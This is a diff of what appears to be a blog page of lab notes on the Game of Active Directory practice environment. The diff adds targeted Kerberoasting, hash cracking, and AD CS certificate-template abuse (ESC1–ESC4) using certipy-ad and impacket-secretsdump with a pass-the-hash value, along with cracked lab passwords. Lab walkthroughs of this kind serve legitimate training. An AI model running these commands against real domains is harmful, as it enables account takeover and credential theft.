@@ -59,13 +59,13 @@
  
 
 <meta name="author" content="Jack69" />
-<meta name="description" content="Status Recovered Passwords: User Password NORTH\robb.stark sexywolfy NORTH\samwell.tarly Heartsbane NORTH\jeor.mormont _L0ngCl@w_ NORTH\jon.snow iknownothing NORTH\brandon.stark iseedeadpeople NORTH\hodor hodor NORTH\arya.stark Needle NORTH\eddard.stark FightP3aceAndHonor! NORTH\catelyn.stark NORTH\sansa.stark NORTH\rickon.stark NORTH\sql_svc YouWillNotKerboroast1ngMeeeeee SEVENKINGDOMS …" />
+<meta name="description" content="Status Recovered Passwords: User Password NORTH\robb.stark sexywolfy NORTH\samwell.tarly Heartsbane NORTH\jeor.mormont _L0ngCl@w_ NORTH\jon.snow iknownothing NORTH\brandon.stark iseedeadpeople NORTH\hodor hodor NORTH\arya.stark Needle NORTH\eddard.stark FightP3aceAndHonor! NORTH\catelyn.stark NORTH\sansa.stark NORTH\rickon.stark NORTH\sql_svcESSOS\sql_svc …" />
 <meta name="keywords" content="">
 
 
   <meta property="og:site_name" content="Jack's Corner"/>
   <meta property="og:title" content="Game of Active Directory Notes"/>
-  <meta property="og:description" content="Status Recovered Passwords: User Password NORTH\robb.stark sexywolfy NORTH\samwell.tarly Heartsbane NORTH\jeor.mormont _L0ngCl@w_ NORTH\jon.snow iknownothing NORTH\brandon.stark iseedeadpeople NORTH\hodor hodor NORTH\arya.stark Needle NORTH\eddard.stark FightP3aceAndHonor! NORTH\catelyn.stark NORTH\sansa.stark NORTH\rickon.stark NORTH\sql_svc YouWillNotKerboroast1ngMeeeeee SEVENKINGDOMS …"/>
+  <meta property="og:description" content="Status Recovered Passwords: User Password NORTH\robb.stark sexywolfy NORTH\samwell.tarly Heartsbane NORTH\jeor.mormont _L0ngCl@w_ NORTH\jon.snow iknownothing NORTH\brandon.stark iseedeadpeople NORTH\hodor hodor NORTH\arya.stark Needle NORTH\eddard.stark FightP3aceAndHonor! NORTH\catelyn.stark NORTH\sansa.stark NORTH\rickon.stark NORTH\sql_svcESSOS\sql_svc …"/>
   <meta property="og:locale" content="en_US"/>
   <meta property="og:url" content="https://ojack69.github.io/jacks-corner/ad/goad.html"/>
   <meta property="og:type" content="article"/>
@@ -140,7 +140,7 @@
 
   <div>
         <div class="toc col-lg-3 hidden-xs hidden-sm">
-            <div id="toc"><ul><li><a class="toc-href" href="#status" title="Status">Status</a></li><li><a class="toc-href" href="#initial-enumeration" title="Initial Enumeration">Initial Enumeration</a></li><li><a class="toc-href" href="#smb-relay" title="SMB Relay">SMB Relay</a></li><li><a class="toc-href" href="#llmnr-poisoning" title="LLMNR Poisoning">LLMNR Poisoning</a></li><li><a class="toc-href" href="#dns-takeover-via-ipv6" title="DNS takeover via IPv6">DNS takeover via IPv6</a></li><li><a class="toc-href" href="#plaintext-password" title="Plaintext Password">Plaintext Password</a></li><li><a class="toc-href" href="#password-spraying" title="Password Spraying">Password Spraying</a><ul><li><a class="toc-href" href="#winterfell" title="WINTERFELL">WINTERFELL</a></li><li><a class="toc-href" href="#kingslanding" title="KINGSLANDING">KINGSLANDING</a></li></ul></li><li><a class="toc-href" href="#credentials-dumping_1" title="Credentials Dumping">Credentials Dumping</a><ul><li><a class="toc-href" href="#north" title="NORTH">NORTH</a><ul><li><a class="toc-href" href="#donpapi" title="DonPAPI">DonPAPI</a></li><li><a class="toc-href" href="#mimikatz" title="Mimikatz">Mimikatz</a></li></ul></li><li><a class="toc-href" href="#kingslanding_2" title="KINGSLANDING">KINGSLANDING</a></li></ul></li><li><a class="toc-href" href="#gpo-abuse_1" title="GPO Abuse">GPO Abuse</a></li><li><a class="toc-href" href="#shares-enumeration" title="Shares Enumeration">Shares Enumeration</a></li><li><a class="toc-href" href="#kerberoasting" title="Kerberoasting">Kerberoasting</a><ul><li><a class="toc-href" href="#targeted-kerberoast" title="Targeted Kerberoast">Targeted Kerberoast</a></li></ul></li><li><a class="toc-href" href="#as-rep-roasting_1" title="AS-REP Roasting">AS-REP Roasting</a><ul><li><a class="toc-href" href="#northsevenkingdomslocal" title="NORTH.SEVENKINGDOMS.LOCAL">NORTH.SEVENKINGDOMS.LOCAL</a></li><li><a class="toc-href" href="#essoslocal" title="ESSOS.local">ESSOS.local</a></li></ul></li><li><a class="toc-href" href="#unconstrained-delegation_1" title="Unconstrained Delegation">Unconstrained Delegation</a></li><li><a class="toc-href" href="#constrained-delegation" title="Constrained Delegation">Constrained Delegation</a><ul><li><a class="toc-href" href="#alternative-1" title="Alternative 1">Alternative 1</a></li><li><a class="toc-href" href="#alternative-2" title="Alternative 2">Alternative 2</a></li></ul></li><li><a class="toc-href" href="#resource-based-constrained-delegation_1" title="Resource-based constrained delegation">Resource-based constrained delegation</a></li><li><a class="toc-href" href="#golden-ticket" title="Golden Ticket">Golden Ticket</a><ul><li><a class="toc-href" href="#child-domain-to-parent" title="Child domain to parent">Child domain to parent</a></li></ul></li><li><a class="toc-href" href="#mssql-abuse_1" title="MSSQL Abuse">MSSQL Abuse</a><ul><li><a class="toc-href" href="#abuse-impersonate-privileges-as-login" title="Abuse impersonate privileges: as Login">Abuse impersonate privileges: as Login</a></li><li><a class="toc-href" href="#abuse-impersonate-privileges-as-user" title="Abuse impersonate privileges: as user">Abuse impersonate privileges: as user</a></li><li><a class="toc-href" href="#abuse-links-trusts" title="Abuse links trusts">Abuse links trusts</a></li><li><a class="toc-href" href="#mssql-relay" title="MSSQL Relay">MSSQL Relay</a></li></ul></li></ul></div>
+            <div id="toc"><ul><li><a class="toc-href" href="#status" title="Status">Status</a></li><li><a class="toc-href" href="#initial-enumeration" title="Initial Enumeration">Initial Enumeration</a></li><li><a class="toc-href" href="#smb-relay" title="SMB Relay">SMB Relay</a></li><li><a class="toc-href" href="#llmnr-poisoning" title="LLMNR Poisoning">LLMNR Poisoning</a></li><li><a class="toc-href" href="#dns-takeover-via-ipv6" title="DNS takeover via IPv6">DNS takeover via IPv6</a></li><li><a class="toc-href" href="#plaintext-password" title="Plaintext Password">Plaintext Password</a></li><li><a class="toc-href" href="#password-spraying" title="Password Spraying">Password Spraying</a><ul><li><a class="toc-href" href="#winterfell" title="WINTERFELL">WINTERFELL</a></li><li><a class="toc-href" href="#kingslanding" title="KINGSLANDING">KINGSLANDING</a></li></ul></li><li><a class="toc-href" href="#credentials-dumping_1" title="Credentials Dumping">Credentials Dumping</a><ul><li><a class="toc-href" href="#north" title="NORTH">NORTH</a><ul><li><a class="toc-href" href="#donpapi" title="DonPAPI">DonPAPI</a></li><li><a class="toc-href" href="#mimikatz" title="Mimikatz">Mimikatz</a></li></ul></li><li><a class="toc-href" href="#kingslanding_2" title="KINGSLANDING">KINGSLANDING</a></li></ul></li><li><a class="toc-href" href="#gpo-abuse_1" title="GPO Abuse">GPO Abuse</a></li><li><a class="toc-href" href="#shares-enumeration" title="Shares Enumeration">Shares Enumeration</a></li><li><a class="toc-href" href="#kerberoasting" title="Kerberoasting">Kerberoasting</a><ul><li><a class="toc-href" href="#targeted-kerberoast" title="Targeted Kerberoast">Targeted Kerberoast</a></li></ul></li><li><a class="toc-href" href="#as-rep-roasting_1" title="AS-REP Roasting">AS-REP Roasting</a><ul><li><a class="toc-href" href="#northsevenkingdomslocal" title="NORTH.SEVENKINGDOMS.LOCAL">NORTH.SEVENKINGDOMS.LOCAL</a></li><li><a class="toc-href" href="#essoslocal" title="ESSOS.local">ESSOS.local</a></li></ul></li><li><a class="toc-href" href="#unconstrained-delegation_1" title="Unconstrained Delegation">Unconstrained Delegation</a></li><li><a class="toc-href" href="#constrained-delegation" title="Constrained Delegation">Constrained Delegation</a><ul><li><a class="toc-href" href="#alternative-1" title="Alternative 1">Alternative 1</a></li><li><a class="toc-href" href="#alternative-2" title="Alternative 2">Alternative 2</a></li></ul></li><li><a class="toc-href" href="#resource-based-constrained-delegation_1" title="Resource-based constrained delegation">Resource-based constrained delegation</a></li><li><a class="toc-href" href="#golden-ticket" title="Golden Ticket">Golden Ticket</a><ul><li><a class="toc-href" href="#child-domain-to-parent" title="Child domain to parent">Child domain to parent</a></li></ul></li><li><a class="toc-href" href="#mssql-abuse_1" title="MSSQL Abuse">MSSQL Abuse</a><ul><li><a class="toc-href" href="#abuse-impersonate-privileges-as-login" title="Abuse impersonate privileges: as Login">Abuse impersonate privileges: as Login</a></li><li><a class="toc-href" href="#abuse-impersonate-privileges-as-user" title="Abuse impersonate privileges: as user">Abuse impersonate privileges: as user</a></li><li><a class="toc-href" href="#abuse-links-trusts" title="Abuse links trusts">Abuse links trusts</a></li><li><a class="toc-href" href="#mssql-relay" title="MSSQL Relay">MSSQL Relay</a></li></ul></li><li><a class="toc-href" href="#ad-cs_1" title="AD CS">AD CS</a><ul><li><a class="toc-href" href="#esc1" title="ESC1">ESC1</a></li><li><a class="toc-href" href="#esc2-esc3" title="ESC2 + ESC3">ESC2 + ESC3</a></li><li><a class="toc-href" href="#esc4" title="ESC4">ESC4</a></li><li><a class="toc-href" href="#esc6" title="ESC6">ESC6</a></li><li><a class="toc-href" href="#esc8" title="ESC8">ESC8</a></li></ul></li></ul></div>
         </div>
     <h2 id="status">Status</h2>
 <p>Recovered Passwords:</p>
@@ -197,7 +197,7 @@
 <td></td>
 </tr>
 <tr>
-<td>NORTH\sql_svc</td>
+<td>NORTH\sql_svc<br/>ESSOS\sql_svc</td>
 <td>YouWillNotKerboroast1ngMeeeeee</td>
 </tr>
 <tr>
@@ -771,7 +771,16 @@ impacket-secretsdump<span class="w"> </span>-k<span class="w"> </span>-no-pass<s
 <p><img alt="north-kerbearoasting-cracking.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/north-kerbearoasting-cracking.png"/></p>
 <p>User <code>NORTH\jon.snow</code>'s password is <code>iknownothing</code>.</p>
 <h4 id="targeted-kerberoast">Targeted Kerberoast</h4>
-<p>Enumerating <code>missandei</code> rights, it's noticed that </p>
+<p>Enumerating <code>missandei</code> rights with <code>BloodHound</code>, it's noticed that this account has <code>GenericAll</code> permissions on <code>khal.drogo</code>; this allows to perform a targeted kerberoast attack against this user.</p>
+<p><img alt="Pasted image 20250223180440.png" src="https://ojack69.github.io/jacks-corner/Pasted image 20250223180440.png"/></p>
+<div class="highlight"><pre><span></span><code>targetedKerberoast.py<span class="w"> </span>-v<span class="w"> </span>-d<span class="w"> </span><span class="s1">'essos.local'</span><span class="w"> </span>-u<span class="w"> </span><span class="s1">'missandei'</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">'fr3edom'</span>
+</code></pre></div>
+<p><img alt="Pasted image 20250223180557.png" src="https://ojack69.github.io/jacks-corner/Pasted image 20250223180557.png"/></p>
+<p>Cracking <code>khal.drogo</code> TGS:</p>
+<div class="highlight"><pre><span></span><code>hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">13100</span><span class="w"> </span>khaldogo.targetedkerberoasting<span class="w"> </span>/usr/share/wordlists/rockyou.txt
+</code></pre></div>
+<p><img alt="Pasted image 20250223180634.png" src="https://ojack69.github.io/jacks-corner/Pasted image 20250223180634.png"/></p>
+<p>Password for <code>khal.drogo</code> is <code>horse</code>.</p>
 <h2 id="as-rep-roasting_1">AS-REP Roasting</h2>
 <h3 id="northsevenkingdomslocal">NORTH.SEVENKINGDOMS.LOCAL</h3>
 <p>Find AS-REP-roastable users:</p>
@@ -800,7 +809,7 @@ impacket-secretsdump<span class="w"> </span>-k<span class="w"> </span>-no-pass<s
 <div class="highlight"><pre><span></span><code>hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">18200</span><span class="w"> </span>missandei.asreproast<span class="w"> </span>/usr/share/wordlists/rockyou.txt
 </code></pre></div>
 <p><img alt="Pasted image 20250223175712.png" src="https://ojack69.github.io/jacks-corner/Pasted image 20250223175712.png"/></p>
-<p>Password for <code>missandei</code> account is <code>fr3edom</code></p>
+<p>Password for <code>missandei</code> account is <code>fr3edom</code>.</p>
 <h2 id="unconstrained-delegation_1">Unconstrained Delegation</h2>
 <p>Enumerate vulnerable computers:</p>
 <div class="highlight"><pre><span></span><code>Get-ADComputer<span class="w"> </span>-Filter<span class="w"> </span><span class="o">{</span>TrustedForDelegation<span class="w"> </span>-eq<span class="w"> </span><span class="nv">$True</span><span class="o">}</span>
@@ -970,6 +979,55 @@ impacket-psexec<span class="w"> </span>-k<span class="w"> </span>-no-pass<span c
 <div class="highlight"><pre><span></span><code><span class="k">&gt; </span><span class="ge">xp_dirtree \\10.1.0.4\notexists</span>
 </code></pre></div>
 <p><img alt="north_BRAAVOS_mssql_relay.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/north_BRAAVOS_mssql_relay.png"/></p>
+<h2 id="ad-cs_1">AD CS</h2>
+<p>Enumerate all vulnerable certificate templates on <code>essos.local</code> with <code>certipy-ad</code>:</p>
+<div class="highlight"><pre><span></span><code>certipy-ad<span class="w"> </span>find<span class="w"> </span>-dc-ip<span class="w"> </span><span class="m">10</span>.1.0.12<span class="w"> </span>-u<span class="w"> </span>khal.drogo@essos.local<span class="w"> </span>-p<span class="w"> </span>horse<span class="w"> </span>-json<span class="w"> </span>-vulnerable
+</code></pre></div>
+<h3 id="esc1">ESC1</h3>
+<p>The template <code>ESC1</code> is found to be vulnerable to <strong>ESC1</strong> abuse.</p>
+<p><img alt="Pasted image 20250223182705.png" src="https://ojack69.github.io/jacks-corner/Pasted image 20250223182705.png"/></p>
+<div class="highlight"><pre><span></span><code>certipy-ad<span class="w"> </span>req<span class="w"> </span>-u<span class="w"> </span>khal.drogo<span class="w"> </span>-p<span class="w"> </span>horse<span class="w"> </span>-ca<span class="w"> </span>ESSOS-CA<span class="w"> </span>-target<span class="w"> </span>braavos.essos.local<span class="w"> </span>-template<span class="w"> </span>ESC1<span class="w"> </span>-upn<span class="w"> </span>administrator@essos.local
+</code></pre></div>
+<p><img alt="Pasted image 20250223181409.png" src="https://ojack69.github.io/jacks-corner/Pasted image 20250223181409.png"/></p>
+<div class="highlight"><pre><span></span><code>certipy-ad<span class="w"> </span>auth<span class="w"> </span>-pfx<span class="w"> </span>administrator.pfx<span class="w"> </span>-dc-ip<span class="w"> </span><span class="m">10</span>.1.0.12
+</code></pre></div>
+<p><img alt="Pasted image 20250223181457.png" src="https://ojack69.github.io/jacks-corner/Pasted image 20250223181457.png"/></p>
+<div class="highlight"><pre><span></span><code>impacket-secretsdump<span class="w"> </span>-hashes<span class="w"> </span>aad3b435b51404eeaad3b435b51404ee:b1794c0bfede743de3a1c22425c2c5e1<span class="w"> </span>essos.local/administrator@braavos.essos.local
+</code></pre></div>
+<p><img alt="Pasted image 20250223182017.png" src="https://ojack69.github.io/jacks-corner/Pasted image 20250223182017.png"/></p>
+<p><code>sql_svc</code> password is leaked: <code>YouWillNotKerboroast1ngMeeeeee</code>.</p>
+<div class="highlight"><pre><span></span><code>impacket-secretsdump<span class="w"> </span>-hashes<span class="w"> </span>aad3b435b51404eeaad3b435b51404ee:b1794c0bfede743de3a1c22425c2c5e1<span class="w"> </span>administrator@essos.local
+</code></pre></div>
+<p><img alt="Pasted image 20250223181726.png" src="https://ojack69.github.io/jacks-corner/Pasted image 20250223181726.png"/></p>
+<h3 id="esc2-esc3">ESC2 + ESC3</h3>
+<p><img alt="Pasted image 20250223183602.png" src="https://ojack69.github.io/jacks-corner/Pasted image 20250223183602.png"/></p>
+<div class="highlight"><pre><span></span><code>certipy-ad<span class="w"> </span>req<span class="w"> </span>-username<span class="w"> </span>khal.drogo<span class="w"> </span>-password<span class="w"> </span>horse<span class="w"> </span>-ca<span class="w"> </span>ESSOS-CA<span class="w"> </span>-target<span class="w"> </span>braavos.essos.local<span class="w"> </span>-template<span class="w"> </span>ESC3-CRA
+</code></pre></div>
+<p><img alt="Pasted image 20250223183939.png" src="https://ojack69.github.io/jacks-corner/Pasted image 20250223183939.png"/></p>
+<p><img alt="Pasted image 20250223185332.png" src="https://ojack69.github.io/jacks-corner/Pasted image 20250223185332.png"/></p>
+<div class="highlight"><pre><span></span><code>certipy-ad<span class="w"> </span>req<span class="w"> </span>-username<span class="w"> </span>khal.drogo<span class="w"> </span>-password<span class="w"> </span>horse<span class="w"> </span>-ca<span class="w"> </span>ESSOS-CA<span class="w"> </span>-target<span class="w"> </span>braavos.essos.local<span class="w"> </span>-template<span class="w"> </span>ESC3<span class="w"> </span>-on-behalf-of<span class="w"> </span><span class="s1">'essos\Administrator'</span><span class="w"> </span>-pfx<span class="w"> </span>khal.drogo.pfx
+</code></pre></div>
+<p><img alt="Pasted image 20250223185131.png" src="https://ojack69.github.io/jacks-corner/Pasted image 20250223185131.png"/></p>
+<div class="highlight"><pre><span></span><code>certipy-ad<span class="w"> </span>auth<span class="w"> </span>-pfx<span class="w"> </span>administrator.pfx<span class="w"> </span>-dc-ip<span class="w"> </span><span class="m">10</span>.1.0.12
+</code></pre></div>
+<p><img alt="Pasted image 20250223185719.png" src="https://ojack69.github.io/jacks-corner/Pasted image 20250223185719.png"/></p>
+<p><img alt="Pasted image 20250223183504.png" src="https://ojack69.github.io/jacks-corner/Pasted image 20250223183504.png"/></p>
+<h3 id="esc4">ESC4</h3>
+<p><img alt="Pasted image 20250223190410.png" src="https://ojack69.github.io/jacks-corner/Pasted image 20250223190410.png"/></p>
+<div class="highlight"><pre><span></span><code>certipy-ad<span class="w"> </span>template<span class="w"> </span>-dc-ip<span class="w"> </span><span class="m">10</span>.1.0.12<span class="w"> &nbsp;</span>-username<span class="w"> </span>khal.drogo<span class="w"> </span>-password<span class="w"> </span>horse<span class="w"> </span>-template<span class="w"> </span>ESC4<span class="w"> </span>-save-old
+</code></pre></div>
+<p><img alt="Pasted image 20250223190544.png" src="https://ojack69.github.io/jacks-corner/Pasted image 20250223190544.png"/></p>
+<div class="highlight"><pre><span></span><code>certipy-ad<span class="w"> </span>find<span class="w"> </span>-dc-ip<span class="w"> </span><span class="m">10</span>.1.0.12<span class="w"> </span>-u<span class="w"> </span>khal.drogo@essos.local<span class="w"> </span>-p<span class="w"> </span>horse<span class="w"> </span>-stdout<span class="w"> </span>-vulnerable
+</code></pre></div>
+<p><img alt="Pasted image 20250223190651.png" src="https://ojack69.github.io/jacks-corner/Pasted image 20250223190651.png"/></p>
+<div class="highlight"><pre><span></span><code>certipy-ad<span class="w"> </span>template<span class="w"> </span>-dc-ip<span class="w"> </span><span class="m">10</span>.1.0.12<span class="w"> &nbsp;</span>-username<span class="w"> </span>khal.drogo<span class="w"> </span>-password<span class="w"> </span>horse<span class="w"> </span>-template<span class="w"> </span>ESC4<span class="w"> </span>-configuration<span class="w"> </span>ESC4.json
+</code></pre></div>
+<p><img alt="Pasted image 20250223190801.png" src="https://ojack69.github.io/jacks-corner/Pasted image 20250223190801.png"/></p>
+<h3 id="esc6">ESC6</h3>
+<p><img alt="Pasted image 20250223190946.png" src="https://ojack69.github.io/jacks-corner/Pasted image 20250223190946.png"/></p>
+<p>Not exploitable!</p>
+<h3 id="esc8">ESC8</h3>
+<p><img alt="Pasted image 20250223195948.png" src="https://ojack69.github.io/jacks-corner/Pasted image 20250223195948.png"/></p>
   </div>
   <div class="tag-cloud">
     <p>
